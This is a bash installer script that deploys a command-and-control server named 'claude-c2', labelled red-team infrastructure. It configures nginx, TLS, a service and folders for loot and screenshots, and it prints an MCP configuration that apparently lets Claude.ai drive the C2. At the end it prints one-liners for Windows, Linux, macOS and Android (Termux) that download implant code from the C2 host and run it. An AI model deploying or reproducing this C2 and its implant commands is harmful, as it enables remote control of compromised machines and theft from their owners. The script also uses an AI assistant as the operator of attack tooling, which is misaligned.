#!/bin/bash
#
# MCP Remote Agent - C2 Server Installer
# Red Team Infrastructure - Tested on Ubuntu 22.04/24.04
#
# Usage: curl -s https://raw.githubusercontent.com/YOUR_USER/claude-c2/main/install.sh | sudo bash
#

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
INSTALL_DIR="/opt/claude-c2"
SERVICE_USER="mcp"
DOMAIN=""
USE_SSLIP=false

echo -e "${CYAN}"
cat << 'EOF'
  __  __  ____ ____    ____  _____ __  __  ___ _____ _____
 |  \/  |/ ___|  _ \  |  _ \| ____|  \/  |/ _ \_   _| ____|
 | |\/| | |   | |_) | | |_) |  _| | |\/| | | | || | |  _|
 | |  | | |___|  __/  |  _ <| |___| |  | | |_| || | | |___
 |_|  |_|\____|_|     |_| \_\_____|_|  |_|\___/ |_| |_____|

         C2 Server Installer - Red Team Infrastructure
EOF
echo -e "${NC}"

# Check root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[!] Please run as root${NC}"
    exit 1
fi

# Detect OS
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$ID
else
    echo -e "${RED}[!] Unsupported OS${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Detected OS: $OS${NC}"

# Get server IP
SERVER_IP=$(curl -s ifconfig.me || curl -s icanhazip.com || hostname -I | awk '{print $1}')
echo -e "${GREEN}[+] Server IP: $SERVER_IP${NC}"

# Ask for domain or use sslip.io
echo ""
echo -e "${YELLOW}[?] Configuration Options:${NC}"
read -p "Enter your domain (leave empty to use sslip.io): " DOMAIN

if [ -z "$DOMAIN" ]; then
    DOMAIN="${SERVER_IP//./-}.sslip.io"
    USE_SSLIP=true
    echo -e "${GREEN}[+] Using sslip.io domain: $DOMAIN${NC}"
else
    echo -e "${GREEN}[+] Using custom domain: $DOMAIN${NC}"
fi

# Install dependencies
echo -e "\n${CYAN}[*] Installing dependencies...${NC}"

if [ "$OS" = "ubuntu" ] || [ "$OS" = "debian" ]; then
    apt-get update -qq
    apt-get install -y -qq curl git nginx certbot python3-certbot-nginx nodejs npm ufw
elif [ "$OS" = "centos" ] || [ "$OS" = "rhel" ] || [ "$OS" = "rocky" ]; then
    yum install -y epel-release
    yum install -y curl git nginx certbot python3-certbot-nginx nodejs npm firewalld
elif [ "$OS" = "fedora" ]; then
    dnf install -y curl git nginx certbot python3-certbot-nginx nodejs npm firewalld
else
    echo -e "${RED}[!] Unsupported OS: $OS${NC}"
    exit 1
fi

# Check Node.js version
NODE_VERSION=$(node -v 2>/dev/null | cut -d'v' -f2 | cut -d'.' -f1)
if [ -z "$NODE_VERSION" ] || [ "$NODE_VERSION" -lt 18 ]; then
    echo -e "${YELLOW}[*] Installing Node.js 20.x...${NC}"
    curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
    apt-get install -y nodejs
fi

echo -e "${GREEN}[+] Node.js version: $(node -v)${NC}"

# Create service user
if ! id "$SERVICE_USER" &>/dev/null; then
    echo -e "${CYAN}[*] Creating service user: $SERVICE_USER${NC}"
    useradd -r -s /bin/false -d "$INSTALL_DIR" "$SERVICE_USER"
fi

# Create installation directory
echo -e "${CYAN}[*] Setting up installation directory...${NC}"
mkdir -p "$INSTALL_DIR"
mkdir -p "$INSTALL_DIR/logs"
mkdir -p "$INSTALL_DIR/loot"
mkdir -p "$INSTALL_DIR/screenshots"
mkdir -p "$INSTALL_DIR/downloads"
mkdir -p "$INSTALL_DIR/agents"

# Clone or copy files
if [ -d "/tmp/claude-c2" ]; then
    cp -r /tmp/claude-c2/* "$INSTALL_DIR/"
elif [ -d "$(dirname "$0")/src" ]; then
    cp -r "$(dirname "$0")"/* "$INSTALL_DIR/"
else
    echo -e "${CYAN}[*] Downloading from repository...${NC}"
    git clone https://github.com/YOUR_USER/claude-c2.git /tmp/claude-c2
    cp -r /tmp/claude-c2/* "$INSTALL_DIR/"
fi

# Generate secrets
echo -e "${CYAN}[*] Generating authentication secrets...${NC}"
CLIENT_SECRET=$(openssl rand -hex 24)
OAUTH_CLIENT_ID=$(openssl rand -hex 16)
OAUTH_CLIENT_SECRET=$(openssl rand -hex 32)
JWT_SECRET=$(openssl rand -hex 32)

# Create .env file
cat > "$INSTALL_DIR/.env" << EOF
# MCP Remote Agent Configuration
# Generated: $(date)

# Server ports
PORT=3100
WS_PORT=3101

# Authentication
CLIENT_AUTH_SECRET=$CLIENT_SECRET
OAUTH_CLIENT_ID=$OAUTH_CLIENT_ID
OAUTH_CLIENT_SECRET=$OAUTH_CLIENT_SECRET
JWT_SECRET=$JWT_SECRET

# Domain configuration
DOMAIN=$DOMAIN
SERVER_IP=$SERVER_IP
EOF

echo -e "${GREEN}[+] Configuration saved to $INSTALL_DIR/.env${NC}"

# Install Node.js dependencies
echo -e "${CYAN}[*] Installing Node.js dependencies...${NC}"
cd "$INSTALL_DIR"
npm init -y > /dev/null 2>&1
npm install express ws uuid dotenv --save > /dev/null 2>&1

# Add type: module to package.json
node -e "
const fs = require('fs');
const pkg = JSON.parse(fs.readFileSync('package.json'));
pkg.type = 'module';
pkg.name = 'claude-c2';
pkg.version = '2.0.0';
fs.writeFileSync('package.json', JSON.stringify(pkg, null, 2));
"

# Set permissions
chown -R "$SERVICE_USER:$SERVICE_USER" "$INSTALL_DIR"
chmod 600 "$INSTALL_DIR/.env"
chmod 755 "$INSTALL_DIR/logs"

# Create systemd service
echo -e "${CYAN}[*] Creating systemd service...${NC}"
cat > /etc/systemd/system/claude-c2.service << EOF
[Unit]
Description=MCP Remote Agent - C2 Server
After=network.target

[Service]
Type=simple
User=$SERVICE_USER
WorkingDirectory=$INSTALL_DIR
ExecStart=/usr/bin/node $INSTALL_DIR/src/server.js
Restart=always
RestartSec=10
Environment=NODE_ENV=production

[Install]
WantedBy=multi-user.target
EOF

# Configure nginx
echo -e "${CYAN}[*] Configuring nginx reverse proxy...${NC}"
cat > /etc/nginx/sites-available/claude-c2 << EOF
# MCP Remote Agent - Nginx Configuration

# HTTP -> HTTPS redirect
server {
    listen 80;
    server_name $DOMAIN;
    return 301 https://\$server_name\$request_uri;
}

# Main HTTPS server
server {
    listen 443 ssl http2;
    server_name $DOMAIN;

    # SSL will be configured by certbot
    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;

    # MCP endpoints
    location / {
        proxy_pass http://127.0.0.1:3100;
        proxy_http_version 1.1;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;

        # SSE support
        proxy_buffering off;
        proxy_cache off;
        proxy_read_timeout 86400;
    }
}

# WebSocket server (SSL)
server {
    listen 3102 ssl;
    server_name $DOMAIN;

    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;

    ssl_protocols TLSv1.2 TLSv1.3;

    location / {
        proxy_pass http://127.0.0.1:3101;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_read_timeout 86400;
    }
}
EOF

# Enable nginx site
ln -sf /etc/nginx/sites-available/claude-c2 /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default

# Get SSL certificate
echo -e "${CYAN}[*] Obtaining SSL certificate...${NC}"
if [ "$USE_SSLIP" = true ]; then
    # For sslip.io, use self-signed cert initially
    mkdir -p /etc/letsencrypt/live/$DOMAIN
    openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
        -keyout /etc/letsencrypt/live/$DOMAIN/privkey.pem \
        -out /etc/letsencrypt/live/$DOMAIN/fullchain.pem \
        -subj "/CN=$DOMAIN" 2>/dev/null
    echo -e "${YELLOW}[!] Using self-signed certificate for sslip.io domain${NC}"
else
    certbot --nginx -d "$DOMAIN" --non-interactive --agree-tos --email admin@"$DOMAIN" || {
        echo -e "${YELLOW}[!] Certbot failed, using self-signed certificate${NC}"
        mkdir -p /etc/letsencrypt/live/$DOMAIN
        openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
            -keyout /etc/letsencrypt/live/$DOMAIN/privkey.pem \
            -out /etc/letsencrypt/live/$DOMAIN/fullchain.pem \
            -subj "/CN=$DOMAIN" 2>/dev/null
    }
fi

# Configure firewall
echo -e "${CYAN}[*] Configuring firewall...${NC}"
if command -v ufw &> /dev/null; then
    ufw allow 22/tcp
    ufw allow 80/tcp
    ufw allow 443/tcp
    ufw allow 3102/tcp
    ufw --force enable
elif command -v firewall-cmd &> /dev/null; then
    firewall-cmd --permanent --add-port=22/tcp
    firewall-cmd --permanent --add-port=80/tcp
    firewall-cmd --permanent --add-port=443/tcp
    firewall-cmd --permanent --add-port=3102/tcp
    firewall-cmd --reload
fi

# Start services
echo -e "${CYAN}[*] Starting services...${NC}"
systemctl daemon-reload
systemctl enable nginx
systemctl restart nginx
systemctl enable claude-c2
systemctl start claude-c2

# Wait for service to start
sleep 3

# Check service status
if systemctl is-active --quiet claude-c2; then
    echo -e "${GREEN}[+] MCP Remote Agent service is running${NC}"
else
    echo -e "${RED}[!] Service failed to start. Check logs: journalctl -u claude-c2${NC}"
fi

# Print summary
echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}  Installation Complete!${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo -e "${CYAN}Server URL:${NC} https://$DOMAIN"
echo -e "${CYAN}WebSocket:${NC} wss://$DOMAIN:3102"
echo -e "${CYAN}Agents Page:${NC} https://$DOMAIN/agents"
echo ""
echo -e "${CYAN}Claude.ai MCP Configuration:${NC}"
echo -e "  Server URL: https://$DOMAIN/mcp/sse"
echo -e "  OAuth Client ID: $OAUTH_CLIENT_ID"
echo -e "  OAuth Client Secret: $OAUTH_CLIENT_SECRET"
echo ""
echo -e "${CYAN}Client Auth Secret:${NC} $CLIENT_SECRET"
echo ""
echo -e "${YELLOW}Agent Deployment Commands:${NC}"
echo ""
echo -e "  ${CYAN}Windows (PowerShell):${NC}"
echo -e "  irm https://$DOMAIN/agent/windows | iex"
echo ""
echo -e "  ${CYAN}Linux:${NC}"
echo -e "  curl -s https://$DOMAIN/agent/linux | bash"
echo ""
echo -e "  ${CYAN}macOS:${NC}"
echo -e "  curl -s https://$DOMAIN/agent/macos | bash"
echo ""
echo -e "  ${CYAN}Android (Termux):${NC}"
echo -e "  curl -s https://$DOMAIN/agent/termux | bash"
echo ""
echo -e "${CYAN}Configuration file:${NC} $INSTALL_DIR/.env"
echo -e "${CYAN}Logs:${NC} journalctl -u claude-c2 -f"
echo ""
echo -e "${GREEN}[+] Installation complete!${NC}"
